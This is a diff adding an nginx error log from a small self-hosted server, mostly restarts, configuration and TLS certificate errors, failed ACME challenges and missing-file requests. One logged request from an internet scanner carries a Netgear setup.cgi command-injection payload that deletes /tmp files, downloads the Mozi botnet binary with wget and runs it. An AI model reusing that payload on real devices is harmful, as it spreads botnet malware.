@@ -1,0 +1,682 @@
+2023/05/05 18:08:43 [emerg] 1#1: "user" directive is not allowed here in /etc/nginx/conf.d/nginx.conf:1
+2023/05/05 18:08:59 [emerg] 1#1: "user" directive is not allowed here in /etc/nginx/conf.d/nginx.conf:1
+2023/05/05 18:09:30 [emerg] 1#1: "http" directive is not allowed here in /etc/nginx/conf.d/nginx.conf:1
+2023/05/05 18:10:15 [emerg] 1#1: unexpected "}" in /etc/nginx/conf.d/nginx.conf:27
+2023/05/05 18:10:44 [warn] 1#1: conflicting server name "localhost" on 0.0.0.0:80, ignored
+2023/05/05 18:10:44 [notice] 1#1: using the "epoll" event method
+2023/05/05 18:10:44 [notice] 1#1: nginx/1.23.4
+2023/05/05 18:10:44 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 18:10:44 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 18:10:44 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 18:10:44 [notice] 1#1: start worker processes
+2023/05/05 18:10:44 [notice] 1#1: start worker process 21
+2023/05/05 18:11:55 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 18:11:55 [notice] 21#21: gracefully shutting down
+2023/05/05 18:11:55 [notice] 21#21: exiting
+2023/05/05 18:11:55 [notice] 21#21: exit
+2023/05/05 18:11:55 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2023/05/05 18:11:55 [notice] 1#1: worker process 21 exited with code 0
+2023/05/05 18:11:55 [notice] 1#1: exit
+2023/05/05 18:22:03 [notice] 1#1: using the "epoll" event method
+2023/05/05 18:22:03 [notice] 1#1: nginx/1.23.4
+2023/05/05 18:22:03 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 18:22:03 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 18:22:03 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 18:22:03 [notice] 1#1: start worker processes
+2023/05/05 18:22:03 [notice] 1#1: start worker process 28
+2023/05/05 18:22:09 [error] 28#28: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 147.135.255.111, server: dev.nld.lol, request: "GET / HTTP/1.1", upstream: "fastcgi://172.26.0.2:9000", host: "dev.nld.lol"
+2023/05/05 18:23:05 [error] 28#28: *4 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 147.135.255.104, server: bot.nld.lol, request: "GET / HTTP/1.1", upstream: "fastcgi://172.26.0.2:9000", host: "bot.nld.lol"
+2023/05/05 18:28:22 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 18:28:22 [notice] 28#28: gracefully shutting down
+2023/05/05 18:28:22 [notice] 28#28: exiting
+2023/05/05 18:28:22 [notice] 28#28: exit
+2023/05/05 18:28:22 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2023/05/05 18:28:22 [notice] 1#1: worker process 28 exited with code 0
+2023/05/05 18:28:22 [notice] 1#1: exit
+2023/05/05 18:28:37 [notice] 1#1: using the "epoll" event method
+2023/05/05 18:28:37 [notice] 1#1: nginx/1.23.4
+2023/05/05 18:28:37 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 18:28:37 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 18:28:37 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 18:28:37 [notice] 1#1: start worker processes
+2023/05/05 18:28:37 [notice] 1#1: start worker process 28
+2023/05/05 18:28:42 [error] 28#28: *1 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 51.178.130.44, server: bot.nld.lol, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.2:9000", host: "bot.nld.lol"
+2023/05/05 18:30:13 [error] 28#28: *4 FastCGI sent in stderr: "Primary script unknown" while reading response header from upstream, client: 145.239.165.168, server: bot.nld.lol, request: "GET / HTTP/1.1", upstream: "fastcgi://172.27.0.2:9000", host: "bot.nld.lol"
+2023/05/05 18:31:45 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 18:31:45 [notice] 28#28: gracefully shutting down
+2023/05/05 18:31:45 [notice] 28#28: exiting
+2023/05/05 18:31:45 [notice] 28#28: exit
+2023/05/05 18:31:45 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2023/05/05 18:31:45 [notice] 1#1: worker process 28 exited with code 0
+2023/05/05 18:31:45 [notice] 1#1: exit
+2023/05/05 18:31:58 [notice] 1#1: using the "epoll" event method
+2023/05/05 18:31:58 [notice] 1#1: nginx/1.23.4
+2023/05/05 18:31:58 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 18:31:58 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 18:31:58 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 18:31:58 [notice] 1#1: start worker processes
+2023/05/05 18:31:58 [notice] 1#1: start worker process 28
+2023/05/05 18:38:34 [error] 28#28: *5 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 179.43.177.243, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "87.115.87.90:80", referrer: "http://87.115.87.90:80/admin/login.asp"
+2023/05/05 18:47:16 [error] 28#28: *10 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 162.142.125.215, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "87.115.87.90"
+2023/05/05 18:53:10 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 18:53:10 [notice] 28#28: gracefully shutting down
+2023/05/05 18:53:10 [notice] 28#28: exiting
+2023/05/05 18:53:10 [notice] 28#28: exit
+2023/05/05 18:53:10 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2023/05/05 18:53:10 [notice] 1#1: worker process 28 exited with code 0
+2023/05/05 18:53:10 [notice] 1#1: exit
+2023/05/05 18:53:26 [notice] 1#1: using the "epoll" event method
+2023/05/05 18:53:26 [notice] 1#1: nginx/1.23.4
+2023/05/05 18:53:26 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 18:53:26 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 18:53:26 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 18:53:26 [notice] 1#1: start worker processes
+2023/05/05 18:53:26 [notice] 1#1: start worker process 21
+2023/05/05 19:05:59 [error] 21#21: *3 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 10.3.1.50, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "www.nld.lol", referrer: "http://www.nld.lol/"
+2023/05/05 19:06:40 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 19:06:40 [notice] 21#21: gracefully shutting down
+2023/05/05 19:06:40 [notice] 21#21: exiting
+2023/05/05 19:06:40 [notice] 21#21: exit
+2023/05/05 19:06:40 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2023/05/05 19:06:40 [notice] 1#1: worker process 21 exited with code 0
+2023/05/05 19:06:40 [notice] 1#1: exit
+2023/05/05 19:06:49 [notice] 1#1: using the "epoll" event method
+2023/05/05 19:06:49 [notice] 1#1: nginx/1.23.4
+2023/05/05 19:06:49 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 19:06:49 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 19:06:49 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 19:06:49 [notice] 1#1: start worker processes
+2023/05/05 19:06:49 [notice] 1#1: start worker process 22
+2023/05/05 19:22:21 [error] 22#22: *2 open() "/usr/share/nginx/html/setup.cgi" failed (2: No such file or directory), client: 112.81.82.87, server: localhost, request: "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0"
+2023/05/05 19:30:38 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 19:30:38 [notice] 22#22: gracefully shutting down
+2023/05/05 19:30:38 [notice] 22#22: exiting
+2023/05/05 19:30:38 [notice] 22#22: exit
+2023/05/05 19:30:38 [notice] 1#1: signal 17 (SIGCHLD) received from 22
+2023/05/05 19:30:38 [notice] 1#1: worker process 22 exited with code 0
+2023/05/05 19:30:38 [notice] 1#1: exit
+2023/05/05 19:30:40 [notice] 1#1: using the "epoll" event method
+2023/05/05 19:30:40 [notice] 1#1: nginx/1.23.4
+2023/05/05 19:30:40 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 19:30:40 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 19:30:40 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 19:30:40 [notice] 1#1: start worker processes
+2023/05/05 19:30:40 [notice] 1#1: start worker process 28
+2023/05/05 19:31:21 [error] 28#28: *1 directory index of "/usr/share/nginx/home/" is forbidden, client: 10.3.1.50, server: nld.lol, request: "GET / HTTP/1.1", host: "nld.lol"
+2023/05/05 19:34:37 [error] 28#28: *2 directory index of "/usr/share/nginx/home/" is forbidden, client: 10.3.1.50, server: nld.lol, request: "GET / HTTP/1.1", host: "nld.lol"
+2023/05/05 19:34:58 [error] 28#28: *3 directory index of "/usr/share/nginx/home/" is forbidden, client: 10.3.1.50, server: nld.lol, request: "GET / HTTP/1.1", host: "home.nld.lol"
+2023/05/05 19:36:24 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 19:36:24 [notice] 28#28: gracefully shutting down
+2023/05/05 19:36:24 [notice] 28#28: exiting
+2023/05/05 19:36:24 [notice] 28#28: exit
+2023/05/05 19:36:24 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2023/05/05 19:36:24 [notice] 1#1: worker process 28 exited with code 0
+2023/05/05 19:36:24 [notice] 1#1: exit
+2023/05/05 19:36:33 [notice] 1#1: using the "epoll" event method
+2023/05/05 19:36:33 [notice] 1#1: nginx/1.23.4
+2023/05/05 19:36:33 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 19:36:33 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 19:36:33 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 19:36:33 [notice] 1#1: start worker processes
+2023/05/05 19:36:33 [notice] 1#1: start worker process 29
+2023/05/05 19:37:26 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 19:37:26 [notice] 29#29: gracefully shutting down
+2023/05/05 19:37:26 [notice] 29#29: exiting
+2023/05/05 19:37:26 [notice] 29#29: exit
+2023/05/05 19:37:26 [notice] 1#1: signal 17 (SIGCHLD) received from 29
+2023/05/05 19:37:26 [notice] 1#1: worker process 29 exited with code 0
+2023/05/05 19:37:26 [notice] 1#1: exit
+2023/05/05 19:37:39 [notice] 1#1: using the "epoll" event method
+2023/05/05 19:37:39 [notice] 1#1: nginx/1.23.4
+2023/05/05 19:37:39 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 19:37:39 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 19:37:39 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 19:37:39 [notice] 1#1: start worker processes
+2023/05/05 19:37:39 [notice] 1#1: start worker process 28
+2023/05/05 19:37:42 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 19:37:42 [notice] 28#28: gracefully shutting down
+2023/05/05 19:37:42 [notice] 28#28: exiting
+2023/05/05 19:37:42 [notice] 28#28: exit
+2023/05/05 19:37:42 [notice] 1#1: signal 17 (SIGCHLD) received from 28
+2023/05/05 19:37:42 [notice] 1#1: worker process 28 exited with code 0
+2023/05/05 19:37:42 [notice] 1#1: exit
+2023/05/05 19:37:54 [notice] 1#1: using the "epoll" event method
+2023/05/05 19:37:54 [notice] 1#1: nginx/1.23.4
+2023/05/05 19:37:54 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 19:37:54 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 19:37:54 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 19:37:54 [notice] 1#1: start worker processes
+2023/05/05 19:37:54 [notice] 1#1: start worker process 21
+2023/05/05 19:42:43 [error] 21#21: *6 open() "/usr/share/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 193.35.18.251, server: localhost, request: "POST /boaform/admin/formLogin HTTP/1.1", host: "87.115.87.90:80", referrer: "http://87.115.87.90:80/admin/login.asp"
+2023/05/05 20:07:32 [error] 21#21: *7 open() "/usr/share/nginx/html/.well-known/acme-challenge/Vc4aPucnrUYCe1KSFcbST8z78uXSF6bDLNTyBUvF4vM" failed (2: No such file or directory), client: 3.145.120.250, server: localhost, request: "GET /.well-known/acme-challenge/Vc4aPucnrUYCe1KSFcbST8z78uXSF6bDLNTyBUvF4vM HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:07:32 [error] 21#21: *8 open() "/usr/share/nginx/html/.well-known/acme-challenge/Vc4aPucnrUYCe1KSFcbST8z78uXSF6bDLNTyBUvF4vM" failed (2: No such file or directory), client: 23.178.112.107, server: localhost, request: "GET /.well-known/acme-challenge/Vc4aPucnrUYCe1KSFcbST8z78uXSF6bDLNTyBUvF4vM HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:07:32 [error] 21#21: *9 open() "/usr/share/nginx/html/.well-known/acme-challenge/Vc4aPucnrUYCe1KSFcbST8z78uXSF6bDLNTyBUvF4vM" failed (2: No such file or directory), client: 52.37.220.71, server: localhost, request: "GET /.well-known/acme-challenge/Vc4aPucnrUYCe1KSFcbST8z78uXSF6bDLNTyBUvF4vM HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:07:54 [notice] 1#1: signal 3 (SIGQUIT) received, shutting down
+2023/05/05 20:07:54 [notice] 21#21: gracefully shutting down
+2023/05/05 20:07:54 [notice] 21#21: exiting
+2023/05/05 20:07:54 [notice] 21#21: exit
+2023/05/05 20:07:54 [notice] 1#1: signal 17 (SIGCHLD) received from 21
+2023/05/05 20:07:54 [notice] 1#1: worker process 21 exited with code 0
+2023/05/05 20:07:54 [notice] 1#1: exit
+2023/05/05 20:11:06 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:11:06 [notice] 1#1: nginx/1.23.4
+2023/05/05 20:11:06 [notice] 1#1: built by gcc 10.2.1 20210110 (Debian 10.2.1-6) 
+2023/05/05 20:11:06 [notice] 1#1: OS: Linux 5.15.0-71-generic
+2023/05/05 20:11:06 [notice] 1#1: getrlimit(RLIMIT_NOFILE): 1048576:1048576
+2023/05/05 20:11:06 [notice] 1#1: start worker processes
+2023/05/05 20:11:06 [notice] 1#1: start worker process 29
+2023/05/05 20:11:25 [error] 29#29: *1 open() "/usr/share/nginx/html/.well-known/acme-challenge/Bp1ZuI8dm5wMXncA0iaSh3bumKsSg3Fubu-a_Hvqadg" failed (2: No such file or directory), client: 3.145.120.250, server: localhost, request: "GET /.well-known/acme-challenge/Bp1ZuI8dm5wMXncA0iaSh3bumKsSg3Fubu-a_Hvqadg HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:11:25 [error] 29#29: *2 open() "/usr/share/nginx/html/.well-known/acme-challenge/Bp1ZuI8dm5wMXncA0iaSh3bumKsSg3Fubu-a_Hvqadg" failed (2: No such file or directory), client: 52.37.220.71, server: localhost, request: "GET /.well-known/acme-challenge/Bp1ZuI8dm5wMXncA0iaSh3bumKsSg3Fubu-a_Hvqadg HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:11:25 [error] 29#29: *3 open() "/usr/share/nginx/html/.well-known/acme-challenge/Bp1ZuI8dm5wMXncA0iaSh3bumKsSg3Fubu-a_Hvqadg" failed (2: No such file or directory), client: 23.178.112.107, server: localhost, request: "GET /.well-known/acme-challenge/Bp1ZuI8dm5wMXncA0iaSh3bumKsSg3Fubu-a_Hvqadg HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:14:15 [error] 29#29: *4 open() "/usr/share/nginx/html/.well-known/acme-challenge/-2GbUW3Wmn9Yg4VXOFmeX2PX3RAaMJcSDSV7KSb67MU" failed (2: No such file or directory), client: 3.145.120.250, server: localhost, request: "GET /.well-known/acme-challenge/-2GbUW3Wmn9Yg4VXOFmeX2PX3RAaMJcSDSV7KSb67MU HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:14:16 [error] 29#29: *5 open() "/usr/share/nginx/html/.well-known/acme-challenge/-2GbUW3Wmn9Yg4VXOFmeX2PX3RAaMJcSDSV7KSb67MU" failed (2: No such file or directory), client: 52.37.220.71, server: localhost, request: "GET /.well-known/acme-challenge/-2GbUW3Wmn9Yg4VXOFmeX2PX3RAaMJcSDSV7KSb67MU HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:14:16 [error] 29#29: *6 open() "/usr/share/nginx/html/.well-known/acme-challenge/-2GbUW3Wmn9Yg4VXOFmeX2PX3RAaMJcSDSV7KSb67MU" failed (2: No such file or directory), client: 23.178.112.107, server: localhost, request: "GET /.well-known/acme-challenge/-2GbUW3Wmn9Yg4VXOFmeX2PX3RAaMJcSDSV7KSb67MU HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:17:17 [notice] 30#30: signal process started
+2023/05/05 20:17:17 [notice] 1#1: signal 1 (SIGHUP) received from 30, reconfiguring
+2023/05/05 20:17:17 [notice] 1#1: reconfiguring
+2023/05/05 20:17:17 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:17:17 [notice] 1#1: start worker processes
+2023/05/05 20:17:17 [notice] 1#1: start worker process 36
+2023/05/05 20:17:17 [notice] 29#29: gracefully shutting down
+2023/05/05 20:17:17 [notice] 29#29: exiting
+2023/05/05 20:17:17 [notice] 29#29: exit
+2023/05/05 20:17:17 [notice] 1#1: signal 17 (SIGCHLD) received from 29
+2023/05/05 20:17:17 [notice] 1#1: worker process 29 exited with code 0
+2023/05/05 20:17:17 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 20:17:31 [error] 36#36: *7 open() "/usr/share/nginx/html/.well-known/acme-challenge/2N1gIwfVMDJUYdsm2iosgu3Uw47t1D3pMhfR4TBvA_E" failed (2: No such file or directory), client: 3.145.120.250, server: localhost, request: "GET /.well-known/acme-challenge/2N1gIwfVMDJUYdsm2iosgu3Uw47t1D3pMhfR4TBvA_E HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:17:31 [error] 36#36: *8 open() "/usr/share/nginx/html/.well-known/acme-challenge/2N1gIwfVMDJUYdsm2iosgu3Uw47t1D3pMhfR4TBvA_E" failed (2: No such file or directory), client: 52.37.220.71, server: localhost, request: "GET /.well-known/acme-challenge/2N1gIwfVMDJUYdsm2iosgu3Uw47t1D3pMhfR4TBvA_E HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:17:32 [error] 36#36: *9 open() "/usr/share/nginx/html/.well-known/acme-challenge/2N1gIwfVMDJUYdsm2iosgu3Uw47t1D3pMhfR4TBvA_E" failed (2: No such file or directory), client: 23.178.112.106, server: localhost, request: "GET /.well-known/acme-challenge/2N1gIwfVMDJUYdsm2iosgu3Uw47t1D3pMhfR4TBvA_E HTTP/1.1", host: "www.nld.lol"
+2023/05/05 20:18:28 [notice] 37#37: signal process started
+2023/05/05 20:18:28 [notice] 1#1: signal 1 (SIGHUP) received from 37, reconfiguring
+2023/05/05 20:18:28 [notice] 1#1: reconfiguring
+2023/05/05 20:18:28 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:18:28 [notice] 1#1: start worker processes
+2023/05/05 20:18:28 [notice] 1#1: start worker process 42
+2023/05/05 20:18:28 [notice] 36#36: gracefully shutting down
+2023/05/05 20:18:28 [notice] 36#36: exiting
+2023/05/05 20:18:28 [notice] 36#36: exit
+2023/05/05 20:18:28 [notice] 1#1: signal 17 (SIGCHLD) received from 36
+2023/05/05 20:18:28 [notice] 1#1: worker process 36 exited with code 0
+2023/05/05 20:18:28 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 20:30:30 [emerg] 43#43: cannot load certificate "/etc/nginx/ssl/live/nld.lol/fullchain.pem": BIO_new_file() failed (SSL: error:02001002:system library:fopen:No such file or directory:fopen('/etc/nginx/ssl/live/nld.lol/fullchain.pem','r') error:2006D080:BIO routines:BIO_new_file:no such file)
+2023/05/05 20:31:04 [emerg] 49#49: cannot load certificate "/etc/nginx/ssl/live/www.nld.lol/fullchain.pem": BIO_new_file() failed (SSL: error:02001002:system library:fopen:No such file or directory:fopen('/etc/nginx/ssl/live/www.nld.lol/fullchain.pem','r') error:2006D080:BIO routines:BIO_new_file:no such file)
+2023/05/05 20:33:48 [notice] 54#54: signal process started
+2023/05/05 20:33:48 [notice] 1#1: signal 1 (SIGHUP) received from 54, reconfiguring
+2023/05/05 20:33:48 [notice] 1#1: reconfiguring
+2023/05/05 20:33:48 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:33:48 [notice] 1#1: start worker processes
+2023/05/05 20:33:48 [notice] 1#1: start worker process 60
+2023/05/05 20:33:48 [notice] 42#42: gracefully shutting down
+2023/05/05 20:33:48 [notice] 42#42: exiting
+2023/05/05 20:33:48 [notice] 42#42: exit
+2023/05/05 20:33:48 [notice] 1#1: signal 17 (SIGCHLD) received from 42
+2023/05/05 20:33:48 [notice] 1#1: worker process 42 exited with code 0
+2023/05/05 20:33:48 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 20:38:07 [notice] 61#61: signal process started
+2023/05/05 20:38:07 [notice] 1#1: signal 1 (SIGHUP) received from 61, reconfiguring
+2023/05/05 20:38:07 [notice] 1#1: reconfiguring
+2023/05/05 20:38:07 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:38:07 [notice] 1#1: start worker processes
+2023/05/05 20:38:07 [notice] 1#1: start worker process 67
+2023/05/05 20:38:07 [notice] 60#60: gracefully shutting down
+2023/05/05 20:38:07 [notice] 60#60: exiting
+2023/05/05 20:38:07 [notice] 60#60: exit
+2023/05/05 20:38:07 [notice] 1#1: signal 17 (SIGCHLD) received from 60
+2023/05/05 20:38:07 [notice] 1#1: worker process 60 exited with code 0
+2023/05/05 20:38:07 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 20:40:13 [notice] 68#68: signal process started
+2023/05/05 20:40:13 [notice] 1#1: signal 1 (SIGHUP) received from 68, reconfiguring
+2023/05/05 20:40:13 [notice] 1#1: reconfiguring
+2023/05/05 20:40:13 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:40:13 [notice] 1#1: start worker processes
+2023/05/05 20:40:13 [notice] 1#1: start worker process 74
+2023/05/05 20:40:13 [notice] 67#67: gracefully shutting down
+2023/05/05 20:40:13 [notice] 67#67: exiting
+2023/05/05 20:40:13 [notice] 67#67: exit
+2023/05/05 20:40:13 [notice] 1#1: signal 17 (SIGCHLD) received from 67
+2023/05/05 20:40:13 [notice] 1#1: worker process 67 exited with code 0
+2023/05/05 20:40:13 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 20:44:42 [error] 74#74: *72 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 54.175.17.142, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "nld-home.ddns.net"
+2023/05/05 20:44:42 [error] 74#74: *73 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 34.234.11.9, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "nld-home.ddns.net"
+2023/05/05 20:44:43 [error] 74#74: *74 open() "/usr/share/nginx/html/favicon.png" failed (2: No such file or directory), client: 104.227.12.223, server: localhost, request: "GET http://nld-home.ddns.net:80/favicon.png HTTP/1.1", host: "nld-home.ddns.net"
+2023/05/05 20:44:43 [error] 74#74: *73 open() "/usr/share/nginx/html/favicon.png" failed (2: No such file or directory), client: 34.234.11.9, server: localhost, request: "GET /favicon.png HTTP/1.1", host: "nld-home.ddns.net"
+2023/05/05 20:45:26 [notice] 75#75: signal process started
+2023/05/05 20:45:26 [notice] 1#1: signal 1 (SIGHUP) received from 75, reconfiguring
+2023/05/05 20:45:26 [notice] 1#1: reconfiguring
+2023/05/05 20:45:26 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:45:26 [notice] 1#1: start worker processes
+2023/05/05 20:45:26 [notice] 1#1: start worker process 81
+2023/05/05 20:45:26 [notice] 74#74: gracefully shutting down
+2023/05/05 20:45:26 [notice] 74#74: exiting
+2023/05/05 20:45:26 [notice] 74#74: exit
+2023/05/05 20:45:26 [notice] 1#1: signal 17 (SIGCHLD) received from 74
+2023/05/05 20:45:26 [notice] 1#1: worker process 74 exited with code 0
+2023/05/05 20:45:26 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 20:48:26 [notice] 82#82: signal process started
+2023/05/05 20:48:26 [notice] 1#1: signal 1 (SIGHUP) received from 82, reconfiguring
+2023/05/05 20:48:26 [notice] 1#1: reconfiguring
+2023/05/05 20:48:26 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:48:26 [notice] 1#1: start worker processes
+2023/05/05 20:48:26 [notice] 1#1: start worker process 88
+2023/05/05 20:48:26 [notice] 81#81: gracefully shutting down
+2023/05/05 20:48:26 [notice] 81#81: exiting
+2023/05/05 20:48:26 [notice] 81#81: exit
+2023/05/05 20:48:26 [notice] 1#1: signal 17 (SIGCHLD) received from 81
+2023/05/05 20:48:26 [notice] 1#1: worker process 81 exited with code 0
+2023/05/05 20:48:26 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 20:53:13 [emerg] 89#89: cannot load certificate "/etc/letsencrypt/live/bot.nld.lol/fullchain.pem": BIO_new_file() failed (SSL: error:02001002:system library:fopen:No such file or directory:fopen('/etc/letsencrypt/live/bot.nld.lol/fullchain.pem','r') error:2006D080:BIO routines:BIO_new_file:no such file)
+2023/05/05 20:54:14 [notice] 94#94: signal process started
+2023/05/05 20:54:14 [notice] 1#1: signal 1 (SIGHUP) received from 94, reconfiguring
+2023/05/05 20:54:14 [notice] 1#1: reconfiguring
+2023/05/05 20:54:14 [notice] 1#1: using the "epoll" event method
+2023/05/05 20:54:14 [notice] 1#1: start worker processes
+2023/05/05 20:54:14 [notice] 1#1: start worker process 100
+2023/05/05 20:54:14 [notice] 88#88: gracefully shutting down
+2023/05/05 20:54:14 [notice] 88#88: exiting
+2023/05/05 20:54:14 [notice] 88#88: exit
+2023/05/05 20:54:14 [notice] 1#1: signal 17 (SIGCHLD) received from 88
+2023/05/05 20:54:14 [notice] 1#1: worker process 88 exited with code 0
+2023/05/05 20:54:14 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:07:16 [crit] 100#100: *234 SSL_do_handshake() failed (SSL: error:14201044:SSL routines:tls_choose_sigalg:internal error) while SSL handshaking, client: 43.131.37.227, server: 0.0.0.0:443
+2023/05/05 21:15:01 [notice] 101#101: signal process started
+2023/05/05 21:15:01 [notice] 1#1: signal 1 (SIGHUP) received from 101, reconfiguring
+2023/05/05 21:15:01 [notice] 1#1: reconfiguring
+2023/05/05 21:15:01 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:15:01 [notice] 1#1: start worker processes
+2023/05/05 21:15:01 [notice] 1#1: start worker process 107
+2023/05/05 21:15:01 [notice] 100#100: gracefully shutting down
+2023/05/05 21:15:01 [notice] 100#100: exiting
+2023/05/05 21:15:01 [notice] 100#100: exit
+2023/05/05 21:15:01 [notice] 1#1: signal 17 (SIGCHLD) received from 100
+2023/05/05 21:15:01 [notice] 1#1: worker process 100 exited with code 0
+2023/05/05 21:15:01 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:18:33 [notice] 108#108: signal process started
+2023/05/05 21:18:33 [notice] 1#1: signal 1 (SIGHUP) received from 108, reconfiguring
+2023/05/05 21:18:33 [notice] 1#1: reconfiguring
+2023/05/05 21:18:33 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:18:33 [notice] 1#1: start worker processes
+2023/05/05 21:18:33 [notice] 1#1: start worker process 114
+2023/05/05 21:18:33 [notice] 107#107: gracefully shutting down
+2023/05/05 21:18:33 [notice] 107#107: exiting
+2023/05/05 21:18:33 [notice] 107#107: exit
+2023/05/05 21:18:33 [notice] 1#1: signal 17 (SIGCHLD) received from 107
+2023/05/05 21:18:33 [notice] 1#1: worker process 107 exited with code 0
+2023/05/05 21:18:33 [notice] 1#1: signal 29 (SIGIO) received
+2023/05/05 21:20:21 [notice] 115#115: signal process started
+2023/05/05 21:20:21 [notice] 1#1: signal 1 (SIGHUP) received from 115, reconfiguring
+2023/05/05 21:20:21 [notice] 1#1: reconfiguring
+2023/05/05 21:20:21 [notice] 1#1: using the "epoll" event method
+2023/05/05 21:20:21 [notice] 1#1: start worker processes
+2023/05/05 21:20:21 [notice] 1#1: start worker process 121
+2023/05/05 21:20:21 [notice] 114#114: gracefully shutting down
+2023/05/05 21:20:21 [notice] 114#114: exiting
+2023/05/05 21:20:21 [notice] 114#114: exit
+2023/05/05 21:20:21 [notice] 1#1: signal 17 (SIGCHLD) received from 114
+2023/05/05 21:20:21 [notice] 1#1: worker process 114 exited with code 0
